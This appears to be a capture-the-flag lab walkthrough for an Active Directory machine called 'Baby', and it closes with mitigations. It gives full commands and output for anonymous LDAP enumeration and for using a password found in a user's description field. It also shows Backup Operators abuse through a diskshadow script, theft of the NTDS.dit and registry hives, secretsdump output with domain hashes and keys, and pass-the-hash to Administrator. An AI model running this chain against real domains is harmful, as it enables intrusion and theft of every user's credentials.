# Introduction

The `Baby` machine is a Windows Active Directory environment that demonstrates common misconfigurations found in enterprise networks. The attack path involves LDAP enumeration to discover user accounts, identifying a user with a default password stored in their description field, leveraging Kerberos authentication to gain initial access, and finally exploiting backup privileges to dump the entire Active Directory database for complete domain compromise.

# Target Information

**Target IP:** `10.10.105.113`

**Domain:** `baby.vl`

**Domain Controller:** `BabyDC.baby.vl`

**Operating System:** `Windows Server (10.0.20348)`

**Difficulty:** `Easy`

# Attack Path Overview

1. **Reconnaissance and Enumeration:**
    - Port scanning reveals Windows AD services.
    - LDAP enumeration discovers domain users.
    - User description field contains default password.
2. **Initial Access:**
    - Kerberos authentication with discovered credentials.
    - Password change required due to expiration.
    - WinRM access obtained.
3. **Privilege Escalation:**
    - User belongs to Backup Operators group.
    - `SeBackupPrivilege` and `SeRestorePrivilege` exploitation.
    - Shadow copy creation for system file access.
4. **Domain Compromise:**
    - `NTDS.dit` extraction using backup privileges.
    - Full domain hash dump with secretsdump.py.
    - Administrator access via pass-the-hash.
    

---

# Phase 1: Reconnaissance and Port Scanning

The initial reconnaissance reveals a Windows Domain Controller with typical AD services running.

### Port Scanning

```
sudo nmap -p- 10.10.105.113 -Pn

PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5357/tcp  open  wsdapi
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49674/tcp open  unknown
49675/tcp open  unknown
54145/tcp open  unknown
54160/tcp open  unknown
```

The detailed service scan confirms this is a Windows Active Directory Domain Controller.

### Detailed Service Enumeration

```
sudo nmap -sV -sC -p 135,139,445,464,593,636,3268,3269,3389,5357,5985,9389 10.10.105.113 -Pn

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: baby.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=BabyDC.baby.vl
| Not valid before: 2025-08-08T12:56:53
|_Not valid after:  2026-02-07T12:56:53
| rdp-ntlm-info:
|   Target_Name: BABY
|   NetBIOS_Domain_Name: BABY
|   NetBIOS_Computer_Name: BABYDC
|   DNS_Domain_Name: baby.vl
|   DNS_Computer_Name: BabyDC.baby.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-09T13:13:09+00:00
|_ssl-date: 2025-08-09T13:13:49+00:00; -1m01s from scanner time.
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: BABYDC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2025-08-09T13:13:13
|_  start_date: N/A
|_clock-skew: mean: -1m01s, deviation: 0s, median: -1m02s
```

**Key Findings:**

- Domain: `baby.vl`.
- Domain Controller: `BabyDC.baby.vl`
- SMB signing enabled and required.
- LDAP service available for enumeration.

---

# Phase 2: LDAP Enumeration

Since LDAP is accessible without authentication, we can enumerate the domain structure and users. First, let's discover the naming contexts.

### Anonymous LDAP Naming Context Enumeration

```
ldapsearch -x -H ldap://10.10.105.113 -s base namingcontexts

# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts
#

#
dn:
namingcontexts: DC=baby,DC=vl
namingcontexts: CN=Configuration,DC=baby,DC=vl
namingcontexts: CN=Schema,CN=Configuration,DC=baby,DC=vl
namingcontexts: DC=DomainDnsZones,DC=baby,DC=vl
namingcontexts: DC=ForestDnsZones,DC=baby,DC=vl

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

Now let's enumerate all user accounts in the domain.

### Anonymous LDAP Domain Users Enumeration

```
ldapsearch -x -H ldap://10.10.105.113 -b "DC=baby,DC=vl" "(objectClass=user)" sAMAccountName

# extended LDIF
#
# LDAPv3
# base <DC=baby,DC=vl> with scope subtree
# filter: (objectClass=user)
# requesting: sAMAccountName
#

# Guest, Users, baby.vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
sAMAccountName: Guest

# Jacqueline Barnett, dev, baby.vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl
sAMAccountName: Jacqueline.Barnett

# Ashley Webb, dev, baby.vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl
sAMAccountName: Ashley.Webb

# Hugh George, dev, baby.vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl
sAMAccountName: Hugh.George

# Leonard Dyer, dev, baby.vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl
sAMAccountName: Leonard.Dyer

# Connor Wilkinson, it, baby.vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl
sAMAccountName: Connor.Wilkinson

# Joseph Hughes, it, baby.vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl
sAMAccountName: Joseph.Hughes

# Kerry Wilson, it, baby.vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl
sAMAccountName: Kerry.Wilson

# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
sAMAccountName: Teresa.Bell

# search reference
ref: ldap://ForestDnsZones.baby.vl/DC=ForestDnsZones,DC=baby,DC=vl

# search reference
ref: ldap://DomainDnsZones.baby.vl/DC=DomainDnsZones,DC=baby,DC=vl

# search reference
ref: ldap://baby.vl/CN=Configuration,DC=baby,DC=vl

# search result
search: 2
result: 0 Success

# numResponses: 13
# numEntries: 9
# numReferences: 3

```

**Users Discovered:**

- **dev OU:** `Jacqueline.Barnett`, `Ashley.Webb`, `Hugh.George`, `Leonard.Dyer`.
- **it OU:** `Connor.Wilkinson`, `Joseph.Hughes`, `Kerry.Wilson`, `Teresa.Bell`.

---

# Phase 3: Discovering Credentials in User Descriptions

Let's check the description fields of all users, as these sometimes contain sensitive information.

```
ldapsearch -x -H ldap://10.10.105.113 -b "DC=baby,DC=vl" "(objectClass=user)" description

# extended LDIF
#
# LDAPv3
# base <DC=baby,DC=vl> with scope subtree
# filter: (objectClass=user)
# requesting: description
#

# Guest, Users, baby.vl
dn: CN=Guest,CN=Users,DC=baby,DC=vl
description: Built-in account for guest access to the computer/domain

# Jacqueline Barnett, dev, baby.vl
dn: CN=Jacqueline Barnett,OU=dev,DC=baby,DC=vl

# Ashley Webb, dev, baby.vl
dn: CN=Ashley Webb,OU=dev,DC=baby,DC=vl

# Hugh George, dev, baby.vl
dn: CN=Hugh George,OU=dev,DC=baby,DC=vl

# Leonard Dyer, dev, baby.vl
dn: CN=Leonard Dyer,OU=dev,DC=baby,DC=vl

# Connor Wilkinson, it, baby.vl
dn: CN=Connor Wilkinson,OU=it,DC=baby,DC=vl

# Joseph Hughes, it, baby.vl
dn: CN=Joseph Hughes,OU=it,DC=baby,DC=vl

# Kerry Wilson, it, baby.vl
dn: CN=Kerry Wilson,OU=it,DC=baby,DC=vl

# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
description: Set initial password to BabyStart123!

# Caroline Robinson, it, baby.vl
dn: CN=Caroline Robinson,OU=it,DC=baby,DC=vl

# search reference
ref: ldap://ForestDnsZones.baby.vl/DC=ForestDnsZones,DC=baby,DC=vl

# search reference
ref: ldap://DomainDnsZones.baby.vl/DC=DomainDnsZones,DC=baby,DC=vl

# search reference
ref: ldap://baby.vl/CN=Configuration,DC=baby,DC=vl

# search result
search: 2
result: 0 Success

# numResponses: 14
# numEntries: 10
# numReferences: 3
```

**Critical Finding:** Teresa Bell's description contains a default password: `BabyStart123!`. Let's confirm Teresa Bell's `sAMAccountName`.

```
ldapsearch -x -H ldap://10.10.105.113 -b "CN=Teresa Bell,OU=it,DC=baby,DC=vl" sAMAccountName

# extended LDIF
#
# LDAPv3
# base <CN=Teresa Bell,OU=it,DC=baby,DC=vl> with scope subtree
# filter: (objectclass=*)
# requesting: sAMAccountName
#

# Teresa Bell, it, baby.vl
dn: CN=Teresa Bell,OU=it,DC=baby,DC=vl
sAMAccountName: Teresa.Bell

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

Let's also extract all `userPrincipalNames` for reference.

```
ldapsearch -x -b "dc=baby,dc=vl" "*" -H ldap://10.10.105.113 | grep userPrincipalName

userPrincipalName: Jacqueline.Barnett@baby.vl
userPrincipalName: Ashley.Webb@baby.vl
userPrincipalName: Hugh.George@baby.vl
userPrincipalName: Leonard.Dyer@baby.vl
userPrincipalName: Connor.Wilkinson@baby.vl
userPrincipalName: Joseph.Hughes@baby.vl
userPrincipalName: Kerry.Wilson@baby.vl
userPrincipalName: Teresa.Bell@baby.vl
userPrincipalName: Caroline.Robinson@baby.vl
```

---

# Phase 4: Initial Authentication and Password Change

Let's try to authenticate as `Teresa.Bell`, but let’s also try other users since the password might have been reused. Let's try `Caroline.Robinson`.

```bash
kinit Caroline.Robinson@BABY.VL
```

The authentication indicates that `Caroline.Robinson`'s password is expired and must be changed. To change the password, we need to configure Kerberos properly. Edit `/etc/krb5.conf`.

```
[libdefaults]
        default_realm = BABY.VL
        dns_lookup_realm = false
        ticket_lifetime = 24h
        renew_lifetime = 7d
        rdns = false
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true

<SNIP>

[realms]
        BABY.VL = {
                kdc = BABYDC.BABY.VL
                admin_server = BABYDC.BABY.VL
        }
```

Now change Caroline's password.

```
kpasswd Caroline.Robinson@BABY.VL
```

---

# Phase 5: Initial Access via WinRM

Once the password is changed, we can request a ticket on Caroline’s behalf and using a `pass-the-ticket` attack to authenticate via WinRM.

```
evil-winrm -i BABYDC.BABY.VL -r BABY.VL
```

After successful authentication, let's check our privileges:

```
*Evil-WinRM* PS C:\Temp> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Let's also check user information:

```
*Evil-WinRM* PS C:\Temp> net user 'caroline.robinson'

User name                    Caroline.Robinson
Full Name                    Caroline Robinson
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            8/9/2025 3:42:06 PM
Password expires             9/20/2025 3:42:06 PM
Password changeable          8/10/2025 3:42:06 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   8/9/2025 3:43:27 PM

Logon hours allowed          All

Local Group Memberships      *Backup Operators
Global Group memberships     *it                   *Domain Users
The command completed successfully.

```

**Key Findings:**

- `Caroline.Robinson` has `SeBackupPrivilege` and `SeRestorePrivilege`.
- User is a member of the **`Backup Operators`** group.

---

# Phase 6: Exploiting Backup Privileges

### Understanding Backup Operators Group

The **`Backup Operators`** group is a built-in Windows group that allows users to:

- Back up and restore files regardless of file permissions.
- Create system backups.
- Access system state information.
- Read files like `NTDS.dit`, `SYSTEM`, and `SECURITY` hives.

### Creating a Shadow Copy

To extract the `NTDS.dit` file (Active Directory database), we need to create a shadow copy since the file is locked at runtime and during normal operation. Let’s create a file called `backup.txt` on Kali and paste in the following set of commands:

```
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup
```

Upload the script using `Evil-WinRM`.

```
upload backup.txt
```

Execute the script by using the `diskshadow` Windows utility.

```
diskshadow /s backup.txt
```

### Extracting Critical System Files

Now we can copy the `NTDS.dit` file and registry hives from the shadow copy.

```
robocopy /b E:\Windows\ntds . NTDS.dit
robocopy /b E:\Windows\System32\config . SYSTEM
robocopy /b E:\Windows\System32\config . SECURITY
```

The we must download the files to our attack machine.

```bash
download NTDS.dit
download SYSTEM
download SECURITY
```

---

# Phase 7: Domain Compromise

### Dumping Domain Credentials

Use Impacket's secretsdump.py to extract offline all domain hashes from the `NTDS.dit` database.

```
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py -system SYSTEM -security SECURITY -ntds ntds.dit LOCAL

[*] Target system bootKey: 0x191d5d3fd5b0b51888453de8541d7e88
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
$MACHINE.ACC:plain_password_hex:cdd6e1d3682ea536a16a4d3762292dd6ef26e8f9ad68163330920d74f5eed8f4ad092bfd71436cff754540922210cbcdd547ebb2399de2dc595357ac9848cb5addbb48a3042ba84d5d5bb5ff6167da1f082ea27deaa03b962d3297e0819361894e63b4d9ed81e7eaa87b7357bed0912b87e338eb0f9490720b8f76617b977581547d36d773b16949abbe1313b866ded07a8ae241a7086f06bd3cb1cdf74801e65f8337b5e73ad8fdad88b4edd75b994b8d537ab11f5ec0a38d6f719f26310c1151ba6bc6069b655ee3f3b5ca8cdcc42ce69d9d8c09057e6b5ca8fccf1d0038945de25a5e247434743697c8e25b1fb630
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:36d9679dabe25509acf94aa77a2c17d3
[*] DPAPI_SYSTEM
dpapi_machinekey:0xe620195f1a5e2d71842bbad9877d7c3ca8a31eda
dpapi_userkey:0x026920834cd39c2e8ba9401c44a8869fe6be0555
[*] NL$KM
 0000   B6 96 C7 7E 17 8A 0C DD  8C 39 C2 0A A2 91 24 44   ...~.....9....$D
 0010   A2 E4 4D C2 09 59 46 C0  7F 95 EA 11 CB 7F CB 72   ..M..YF........r
 0020   EC 2E 5A 06 01 1B 26 FE  6D A7 88 0F A5 E7 1F A5   ..Z...&.m.......
 0030   96 CD E5 3F A0 06 5E C1  A5 01 A1 CE 8C 24 76 95   ...?..^......$v.
NL$KM:b696c77e178a0cdd8c39c20aa2912444a2e44dc2095946c07f95ea11cb7fcb72ec2e5a06011b26fe6da7880fa5e71fa596cde53fa0065ec1a501a1ce8c247695
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 41d56bf9b458d01951f592ee4ba00ea6
[*] Reading and decrypting hashes from ntds.dit
Administrator:500:aad3b435b51404eeaad3b435b51404ee:ee4457ae59f1...............:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
BABYDC$:1000:aad3b435b51404eeaad3b435b51404ee:36d9679dabe25509acf94aa77a2c17d3:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6da4842e8c24b99ad21a92d620893884:::
baby.vl\Jacqueline.Barnett:1104:aad3b435b51404eeaad3b435b51404ee:20b8853f7aa61297bfbc5ed2ab34aed8:::
baby.vl\Ashley.Webb:1105:aad3b435b51404eeaad3b435b51404ee:02e8841e1a2c6c0fa1f0becac4161f89:::
baby.vl\Hugh.George:1106:aad3b435b51404eeaad3b435b51404ee:f0082574cc663783afdbc8f35b6da3a1:::
baby.vl\Leonard.Dyer:1107:aad3b435b51404eeaad3b435b51404ee:b3b2f9c6640566d13bf25ac448f560d2:::
baby.vl\Ian.Walker:1108:aad3b435b51404eeaad3b435b51404ee:0e440fd30bebc2c524eaaed6b17bcd5c:::
baby.vl\Connor.Wilkinson:1110:aad3b435b51404eeaad3b435b51404ee:e125345993f6258861fb184f1a8522c9:::
baby.vl\Joseph.Hughes:1112:aad3b435b51404eeaad3b435b51404ee:31f12d52063773769e2ea5723e78f17f:::
baby.vl\Kerry.Wilson:1113:aad3b435b51404eeaad3b435b51404ee:181154d0dbea8cc061731803e601d1e4:::
baby.vl\Teresa.Bell:1114:aad3b435b51404eeaad3b435b51404ee:7735283d187b758f45c0565e22dc20d8:::
baby.vl\Caroline.Robinson:1115:aad3b435b51404eeaad3b435b51404ee:833fc8820cbf8dbcdd9cc087f9029013:::
[*] Kerberos keys from ntds.dit
Administrator:aes256-cts-hmac-sha1-96:ad08cbabedff5acb70049bef721524a23375708cadefcb788704ba00926944f4
Administrator:aes128-cts-hmac-sha1-96:ac7aa518b36d5ea26de83c8d6aa6714d
Administrator:des-cbc-md5:d38cb994ae806b97
BABYDC$:aes256-cts-hmac-sha1-96:7dd1db235d37460d71030418ebd734e66a1669effc17d1cb1c7509e5ad9c81e5
BABYDC$:aes128-cts-hmac-sha1-96:cf50b6fbbd1567b06f37853c3a6c544d
BABYDC$:des-cbc-md5:a7f18f086bb554ea
krbtgt:aes256-cts-hmac-sha1-96:9c578fe1635da9e96eb60ad29e4e4ad90fdd471ea4dff40c0c4fce290a313d97
krbtgt:aes128-cts-hmac-sha1-96:1541c9f79887b4305064ddae9ba09e14
krbtgt:des-cbc-md5:d57383f1b3130de5
baby.vl\Jacqueline.Barnett:aes256-cts-hmac-sha1-96:851185add791f50bcdc027e0a0385eadaa68ac1ca127180a7183432f8260e084
baby.vl\Jacqueline.Barnett:aes128-cts-hmac-sha1-96:3abb8a49cf283f5b443acb239fd6f032
baby.vl\Jacqueline.Barnett:des-cbc-md5:01df1349548a206b
baby.vl\Ashley.Webb:aes256-cts-hmac-sha1-96:fc119502b9384a8aa6aff3ad659aa63bab9ebb37b87564303035357d10fa1039
baby.vl\Ashley.Webb:aes128-cts-hmac-sha1-96:81f5f99fd72fadd005a218b96bf17528
baby.vl\Ashley.Webb:des-cbc-md5:9267976186c1320e
baby.vl\Hugh.George:aes256-cts-hmac-sha1-96:0ea359386edf3512d71d3a3a2797a75db3168d8002a6929fd242eb7503f54258
baby.vl\Hugh.George:aes128-cts-hmac-sha1-96:50b966bdf7c919bfe8e85324424833dc
baby.vl\Hugh.George:des-cbc-md5:296bec86fd323b3e
baby.vl\Leonard.Dyer:aes256-cts-hmac-sha1-96:6d8fd945f9514fe7a8bbb11da8129a6e031fb504aa82ba1e053b6f51b70fdddd
baby.vl\Leonard.Dyer:aes128-cts-hmac-sha1-96:35fd9954c003efb73ded2fde9fc00d5a
baby.vl\Leonard.Dyer:des-cbc-md5:022313dce9a252c7
baby.vl\Ian.Walker:aes256-cts-hmac-sha1-96:54affe14ed4e79d9c2ba61713ef437c458f1f517794663543097ff1c2ae8a784
baby.vl\Ian.Walker:aes128-cts-hmac-sha1-96:78dbf35d77f29de5b7505ee88aef23df
baby.vl\Ian.Walker:des-cbc-md5:bcb094c2012f914c
baby.vl\Connor.Wilkinson:aes256-cts-hmac-sha1-96:55b0af76098dfe3731550e04baf1f7cb5b6da00de24c3f0908f4b2a2ea44475e
baby.vl\Connor.Wilkinson:aes128-cts-hmac-sha1-96:9d4af8203b2f9e3ecf64c1cbbcf8616b
baby.vl\Connor.Wilkinson:des-cbc-md5:fda762e362ab7ad3
baby.vl\Joseph.Hughes:aes256-cts-hmac-sha1-96:2e5f25b14f3439bfc901d37f6c9e4dba4b5aca8b7d944957651655477d440d41
baby.vl\Joseph.Hughes:aes128-cts-hmac-sha1-96:39fa92e8012f1b3f7be63c7ca9fd6723
baby.vl\Joseph.Hughes:des-cbc-md5:02f1cd9e52e0f245
baby.vl\Kerry.Wilson:aes256-cts-hmac-sha1-96:db5f7da80e369ee269cd5b0dbaea74bf7f7c4dfb3673039e9e119bd5518ea0fb
baby.vl\Kerry.Wilson:aes128-cts-hmac-sha1-96:aebbe6f21c76460feeebea188affbe01
baby.vl\Kerry.Wilson:des-cbc-md5:1f191c8c49ce07fe
baby.vl\Teresa.Bell:aes256-cts-hmac-sha1-96:8bb9cf1637d547b31993d9b0391aa9f771633c8f2ed8dd7a71f2ee5b5c58fc84
baby.vl\Teresa.Bell:aes128-cts-hmac-sha1-96:99bf021e937e1291cc0b6e4d01d96c66
baby.vl\Teresa.Bell:des-cbc-md5:4cbcdc3de6b50ee9
baby.vl\Caroline.Robinson:aes256-cts-hmac-sha1-96:cad02c3f69f9f577bc0bfddce740fdc1149d851dc4b256dbf8a32e16ac125fae
baby.vl\Caroline.Robinson:aes128-cts-hmac-sha1-96:2b5237ba6be5ad5a3865268762b2defb
baby.vl\Caroline.Robinson:des-cbc-md5:f891769ea7d9e57f
[*] Cleaning up...

```

### Administrator Access

Using pass-the-hash with the extracted Administrator NTLM hash:

```
evil-winrm -i 10.10.105.113 -u Administrator -H ee4457ae59f1...............
```

We now have full Administrator access to the domain controller. The flag can be found in the Administrator's Desktop.

---

# Key Vulnerabilities Exploited

### 1. **Information Disclosure via LDAP**

- **Vulnerability:** Anonymous LDAP bind allowed complete domain enumeration.
- **Impact:** Disclosed all user accounts and organizational structure.
- **Mitigation:** Disable anonymous LDAP binds and implement proper LDAP access controls.

### 2. **Sensitive Information in User Descriptions**

- **Vulnerability:** Default password stored in user description field.
- **Impact:** Provided initial credentials for domain access.
- **Mitigation:** Never store passwords in user attributes; use secure password distribution methods.

### 3. **Password Policy Weakness**

- **Vulnerability:** Weak password requirements and password reuse.
- **Impact:** Same default password used across multiple accounts.
- **Mitigation:** Implement strong password policies and unique passwords per account.

### 4. **Excessive Privilege Assignment**

- **Vulnerability:** User assigned to Backup Operators group unnecessarily.
- **Impact:** Granted `SeBackupPrivilege` and `SeRestorePrivilege` allowing full system access.
- **Mitigation:** Follow principle of least privilege; regularly audit group memberships.

### 5. **Inadequate Backup Privilege Controls**

- **Vulnerability:** Backup privileges allow reading any file including sensitive system files.
- **Impact:** Complete domain compromise through `NTDS.dit` extraction.
- **Mitigation:** Restrict backup privileges to dedicated service accounts; monitor backup operations.

---

### Lessons Learned

1. **LDAP Security:** Always disable anonymous LDAP binds and implement proper access controls for directory services.
2. **Credential Management:** Never store passwords in user attributes or comments. Use secure credential management systems.
3. **Privilege Management:** Regularly audit user privileges and group memberships. Apply the principle of least privilege consistently.
4. **Backup Security:** Understand that backup privileges are essentially administrative privileges. Treat them with appropriate security controls.
5. **Password Policies:** Implement strong password policies and ensure unique passwords for all accounts, especially service and administrative accounts.
6. **Monitoring:** Implement monitoring for sensitive operations like shadow copy creation and backup file access.

---

This walkthrough demonstrates a realistic attack path in an Active Directory environment where misconfigurations and poor security practices lead to complete domain compromise. The Baby machine effectively illustrates how seemingly minor security oversights can cascade into full organizational compromise.
